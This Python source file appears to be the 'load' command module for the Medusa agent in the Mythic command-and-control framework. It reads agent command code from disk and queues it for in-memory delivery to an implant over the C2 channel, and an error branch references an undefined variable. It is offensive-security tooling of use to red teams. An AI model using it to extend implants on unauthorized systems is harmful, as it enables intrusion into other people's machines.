from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json, base64, os

class LoadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                type=ParameterType.ChooseOne,
                description="Command to load into the agent",
                dynamic_query_function=self.get_commands
            ),
        ]

    # async def get_commands(self, callback: dict) -> [str]:
    async def get_commands(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)

        callbacks = await SendMythicRPCCallbackSearch(MythicRPCCallbackSearchMessage(
            SearchCallbackID=inputMsg.Callback,
            AgentCallbackID=inputMsg.Callback
        ))
        
        payload_os = ""
        python_version = ""

        if callbacks.Success:
            payloads = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                CallbackID=inputMsg.Callback, PayloadUUID=callbacks.Results[0].RegisteredPayloadUUID
            ))
            if payloads.Success:
                payload_os = payloads.Payloads[0].SelectedOS
                python_version = [param.Value for param in payloads.Payloads[0].BuildParameters if param.Name == 'python_version'][0]
            else:
                raise Exception(f"Failed to get payload: {payloads.Error}")
        else:
            raise Exception(f"Failed to get callback: {callbacks.Error}")
        
        all_cmds = await SendMythicRPCCommandSearch(MythicRPCCommandSearchMessage(
            SearchPayloadTypeName="medusa",
            SearchOS=payload_os,
            SearchAttributes={
                "supported_python_versions": [python_version],
            },
        ))

        loaded_cmds = await SendMythicRPCCallbackSearchCommand(MythicRPCCallbackSearchCommandMessage(
            CallbackID=inputMsg.Callback
        ))

        if not all_cmds.Success:
            raise Exception("Failed to get commands for medusa agent: {}".format(all_cmds.Error))
        if not loaded_cmds.Success:
            raise Exception("Failed to fetch loaded commands from callback {}: {}".format(inputMsg.Callback, loaded_cmds.Error))

        all_cmds_names = set([r.Name for r in all_cmds.Commands])
        loaded_cmds_names = set([r.Name for r in loaded_cmds.Commands])
        
        logger.info(all_cmds_names)
        logger.info(loaded_cmds_names)
    
        diff = all_cmds_names.difference(loaded_cmds_names)
        fileResponse.Success = True
        fileResponse.Choices = sorted(diff)
        return fileResponse

    
    async def parse_arguments(self):
        if self.command_line[0] != "{":
            self.add_arg("command", self.command_line)
        else:
            self.load_args_from_json_string(self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)

class LoadCommand(CommandBase):
    cmd = "load"
    needs_admin = False
    help_cmd = "load"
    description = "This loads new functions into memory via the C2 channel."
    version = 1
    author = "@ajpc500"
    parameters = []
    attackmapping = ["T1030", "T1129"]
    argument_class = LoadArguments
    attributes = CommandAttributes(
        supported_python_versions=["Python 2.7", "Python 3.8"],
        supported_os=[SupportedOS.MacOS, SupportedOS.Windows, SupportedOS.Linux ],
    )




    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        command = await SendMythicRPCCommandSearch(MythicRPCCommandSearchMessage(
            SearchPayloadTypeName="medusa",
            SearchCommandNames=[taskData.args.get_arg("command")],
            SearchOS=taskData.Payload.OS
        ))

        build_params = taskData.BuildParameters
        for build_param in build_params:
            if build_param.Name == 'python_version':
                py_ver = build_param.Value
        
        py_suffix = ".py2" if py_ver == "Python 2.7" else ".py3"

        cmd_code = ""
        if command.Success:
            loadingCommand = ""
            for cmd in command.Commands:
                try:
                    path = ""
                    for func in os.listdir(self.agent_code_path):
                        if (func.endswith(py_suffix) or func.endswith(".py")) and cmd.Name == func.split(".")[0]:
                            path = func
                            break
                    code_path = self.agent_code_path / "{}".format(path)
                    cmd_code = open(code_path, "r").read() + "\n"
                    loadingCommand = cmd.Name
                except Exception as e:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=taskData.Task.ID,
                        Response=f"Failed to find code for {cmd.Name}, skipping it\n".encode()
                    ))

            if cmd_code != "":
                resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                    TaskID=taskData.Task.ID,
                    Comment=f"Loading the following command: {loadingCommand}\n",
                    FileContents=cmd_code.encode(),
                    Filename=f"medusa load command",
                    DeleteAfterFetch=True
                ))
                if resp.Success:
                    taskData.args.add_arg("file_id", resp.AgentFileId)
                    response.DisplayParams = f"command: {loadingCommand}"
                else:
                    raise Exception("Failed to register file: " + resp.Error)
            else:
                response.Completed = True
                response.DisplayParams = f"no command"
                return response
        else:
            raise Exception("Failed to fetch commands from Mythic: " + commands.Error)
        
        return response


    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp